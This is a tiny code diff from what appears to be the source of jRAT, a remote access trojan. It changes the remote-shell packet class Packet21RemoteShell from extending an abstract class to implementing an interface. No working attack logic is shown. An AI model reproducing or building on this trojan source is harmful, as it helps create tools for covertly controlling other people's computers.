@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet21RemoteShell extends AbstractOutgoingPacket {
+public class Packet21RemoteShell implements OutgoingPacket {
 
 	private String line;
 
